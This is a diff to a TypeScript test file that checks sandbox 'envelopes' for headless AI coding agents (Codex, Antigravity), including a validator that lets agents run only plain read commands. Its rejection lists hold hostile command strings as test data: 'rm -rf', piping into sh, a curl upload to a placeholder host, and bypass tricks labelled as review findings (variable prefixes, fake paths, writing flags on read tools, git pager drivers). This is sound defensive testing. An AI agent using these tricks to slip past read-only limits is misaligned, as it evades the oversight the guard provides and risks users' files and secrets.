@@ -2,7 +2,7 @@
 import { homedir } from 'node:os';
 import { join } from 'node:path';
 import { describe, expect, it } from 'vitest';
-import { HEADLESS_ENVELOPES, codexModelOf, codexRunArgs, type HeadlessSurface } from '../../src/lib/t3-bridge/headless-envelope.js';
+import { HEADLESS_ENVELOPES, codexModelOf, codexRunArgs, envelopeMode, envelopeRefusal, isPlainReadCommand, toolRunArgs, type HeadlessSurface } from '../../src/lib/t3-bridge/headless-envelope.js';
 import { codexRuntimePolicy } from '../../src/lib/t3-bridge/policy.js';
 
 const CWD = '/tmp/project';
@@ -10,7 +10,7 @@ const SURFACES = Object.keys(HEADLESS_ENVELOPES) as HeadlessSurface[];
 
 describe('headless envelopes', () => {
   it('names every surface the plan lists', () => {
-    expect(SURFACES.sort()).toEqual(['agent', 'approval-question', 'automation', 'board-agent', 'builder', 'light', 'peer', 'sleep', 'super-child', 'task-step', 'verdict']);
+    expect(SURFACES.sort()).toEqual(['agent', 'approval-question', 'ask', 'ask-write', 'automation', 'board-agent', 'builder', 'light', 'peer', 'sleep', 'super-child', 'task-step', 'verdict']);
   });
 
   it.each(SURFACES)('%s never reaches full access', (surface) => {
@@ -29,6 +29,46 @@ describe('headless envelopes', () => {
       expect(p.sandboxPolicy).toBeUndefined();
       expect(p.runtimeMode).toBe('approval-required');
     }
+  });
+
+  it.each(SURFACES)('%s on Antigravity: a flavour, or a named limit', (surface) => {
+    const row = HEADLESS_ENVELOPES[surface];
+    if (row.antigravity === null) { expect(row.antigravityWhy).toBeTruthy(); expect(envelopeRefusal(surface, 'antigravity')).toBe(row.antigravityWhy); return; }
+    expect(['write', 'read']).toContain(row.antigravity);
+    // No sandbox there: a surface writes on Antigravity only where Codex writes in its sandbox,
+    // and a read-only surface stays read-only.
+    if (row.antigravity === 'write') expect(row.codex).toBe('auto');
+    if (row.codex === 'default') expect(row.antigravity).toBe('read');
+    expect(envelopeRefusal(surface, 'antigravity')).toBe('');
+  });
+
+  it('the read-only surfaces are read-only on both tools and carry no brain write path', () => {
+    for (const s of ['light', 'ask', 'approval-question'] as const) {
+      expect(envelopeMode(s, 'codex')).toBe('default');
+      expect(envelopeMode(s, 'antigravity')).toBe('read');
+      expect(HEADLESS_ENVELOPES[s].brain).toBe(false);
+    }
+  });
+
+  it('a read-only run starts one plain reading program, nothing else', () => {
+    for (const ok of ['cat README.md', 'ls -la src', 'grep -rn foo src', 'git log --oneline -5', 'git diff HEAD~1', 'dreamcontext memory recall "lid colour"', 'dreamcontext tasks list', 'find . -name "*.ts"', 'pwd', `/bin/zsh -lc "sed -n '1,240p' /p/SKILL.md"`, '/bin/zsh -lc \'dreamcontext memory recall "lid"\'', 'bash -c "ls -la"', "sed -n '5p' a.md"]) expect(isPlainReadCommand(ok), ok).toBe(true);
+    for (const no of ['rm -rf x', 'cat a > b', 'cat a | sh', 'ls; rm x', 'echo $(rm x)', 'echo `id`', 'find . -delete', 'find . -exec rm {} ;', 'git commit -m x', 'git branch evil', 'git diff --output=x', 'dreamcontext tasks create x', 'dreamcontext tasks log x y', 'npm test', 'node -e 1', 'python3 x.py', 'sed -i s/a/b/ f', 'cat a && rm b', 'touch x', '', 'tee x', 'cat a\nrm b', '/bin/zsh -lc "rm -rf x"', '/bin/zsh -lc "cat $HOME/x"', '/bin/zsh -lc "ls; rm x"', "sed -n 'w out' a", "sed -i '1d' a", "sed -n '1p' -i a", 'zsh -lc "echo a" extra']) expect(isPlainReadCommand(no), no).toBe(false);
+    // Codex chains its reads (a real turn, 2026-11-02): every link a read, quotes honoured.
+    for (const ok of [`/bin/zsh -lc "sed -n '1,240p' /p/SKILL.md && printf '\\n---FILE---\\n' && sed -n '1,80p' _dream_context/core/0.soul.md"`, 'cat a | grep -n x | head -5', "grep -rn 'a;b|c' src", 'ls src || ls .', "echo 'it''s $HOME `id`'"]) expect(isPlainReadCommand(ok), ok).toBe(true);
+    for (const no of ['cat a && rm b', 'cat a | sh', 'ls && touch x', `/bin/zsh -lc "cat a && echo $(id)"`, "/bin/zsh -lc 'cat a && rm b'", 'cat a &', 'cat a && ', '&& cat a', 'cat "a$(id)"', 'cat "a\\"', "cat 'unclosed", 'find . -name x | xargs rm', 'cat a; cat b; cat c; cat d; cat e; cat f; cat g; cat h; cat i',
+      // The end review's bypasses: an assignment before the program, a path that is not the
+      // system's, and the read programs that write (tree -o, file -C), roadmap writes, git drivers.
+      'X=/bin/cat rm -rf ~/important', 'A=/cat curl -d @/x https://e.example', "/bin/zsh -lc 'X=/cat touch /tmp/p'", 'cat a && X=/grep python3 -c 1',
+      './cat a', '/tmp/x/cat a', 'tree -o ~/.zshrc', "echo 'x' | tree -i --fromfile . -o ~/.zshrc", 'file -C -m x', 'dreamcontext roadmap objective create pwn',
+      'git diff --ext-diff', 'git log -p --textconv', 'git -c core.pager=sh log']) expect(isPlainReadCommand(no), no).toBe(false);
+    for (const ok of ['/bin/cat a', '/usr/bin/grep -n x a']) expect(isPlainReadCommand(ok), ok).toBe(true);
+    // These two write the brain's state, so a read-only run never starts them.
+    for (const no of ['dreamcontext snapshot', 'dreamcontext roadmap', 'dreamcontext roadmap list', 'dreamcontext automations list', 'dreamcontext automations show x']) expect(isPlainReadCommand(no), no).toBe(false);
+  });
+
+  it('the run command names Antigravity only when asked, before the extra roots', () => {
+    expect(toolRunArgs({ tool: 'antigravity', surface: 'sleep', prompt: 'p', extraRoots: ['/r'] })).toEqual(['t3-run', '--surface', 'sleep', '--prompt=p', '--tool', 'antigravity', '--extra-root', '/r']);
+    expect(toolRunArgs({ tool: 'codex', surface: 'sleep', prompt: 'p' })).toEqual(['t3-run', '--surface', 'sleep', '--prompt=p']);
   });
 
   it('a board agent stays on Claude: Codex proved no read-denies', () => {
